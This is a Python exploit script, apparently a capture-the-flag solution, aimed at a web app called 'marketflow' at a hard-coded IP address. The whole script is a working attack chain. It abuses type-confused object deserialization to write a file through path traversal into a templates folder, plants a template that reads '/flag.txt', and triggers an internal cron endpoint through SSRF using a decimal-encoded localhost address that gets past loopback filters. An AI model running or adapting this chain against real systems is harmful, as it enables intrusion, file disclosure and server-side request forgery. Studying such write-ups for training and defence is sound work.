import requests
import random
import string
import re
import sys
import time

BASE_URL = "http://34.10.220.48:6002"
INTERNAL_CRON_URL = "http://2130706433:5000/internal/cron/process"

def random_str(k=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=k))

def exploit():
    s = requests.Session()
    
    print(f"[+] Target: {BASE_URL}")
    
    username = random_str()
    password = random_str()
    email = f"{username}@marketflow.local"
    
    print(f"[*] Registering user: {username}")
    r = s.post(f"{BASE_URL}/api/auth/register", json={
        "username": username,
        "password": password,
        "email": email
    })
    if r.status_code != 201:
        print(f"[-] Registration failed: {r.text}")
        sys.exit(1)
        
    print(f"[*] Logging in...")
    r = s.post(f"{BASE_URL}/api/auth/login", json={
        "username": username,
        "password": password
    })
    if r.status_code != 200:
        print(f"[-] Login failed: {r.text}")
        sys.exit(1)
    
    print("[+] Authentication successful")
    
    tpl_name = f"exploit_{random_str()}.tpl"
    malicious_template = "# -*- mode: legacy -*-\n@config:/flag.txt"
    
    print(f"[*] Scheduling malicious report using template: {tpl_name}")
    
    payload = {
        "_type": "ReportConfiguration",
        "report_type": "security_audit",
        "date_range": "today",
        "processor": {
            "_type": "AnalyticsProcessor",
            "data_source": "internal",
            "output_config": {
                "_type": "CacheConfiguration",
                "cache_key": f"cache_{random_str()}",
                "objects": [malicious_template],
                "persistence": {
                    "_type": "PersistenceAdapter",
                    "storage_path": f"../templates/{tpl_name}",
                    "mode": "w"
                }
            }
        },
        "template": {
            "_type": "TemplateSpecification",
            "template_name": tpl_name
        }
    }
    
    r = s.post(f"{BASE_URL}/api/analytics/reports", json=payload)
    if r.status_code != 200:
        print(f"[-] Failed to schedule report: {r.text}")
        sys.exit(1)
        
    report_data = r.json()
    report_url = report_data.get('report_url')
    print(f"[+] Report scheduled. URL: {report_url}")
    
    print(f"[*] Triggering internal cron via SSRF...")
    
    webhook_payload = {
        "_type": "WebhookForwarder",
        "target_url": INTERNAL_CRON_URL,
        "method": "POST"
    }
    
    r = s.post(f"{BASE_URL}/api/webhooks/forward", json=webhook_payload)
    print(f"[*] SSRF Response: {r.text}")
    
    print(f"[*] Fetching report to retrieve flag...")
    time.sleep(1)
    
    r = s.get(f"{BASE_URL}{report_url}")
    
    if r.status_code == 200:
        content = r.text
        if "flag{" in content:
            flag = re.search(r"flag\{.*?\}", content).group(0)
            print(f"\n[+] SUCCESS! Flag found: {flag}\n")
        else:
            print("[-] Report fetched but flag not found in content.")
            print(content[:500])
    else:
        print(f"[-] Failed to fetch report. Status: {r.status_code}")

if __name__ == "__main__":
    exploit()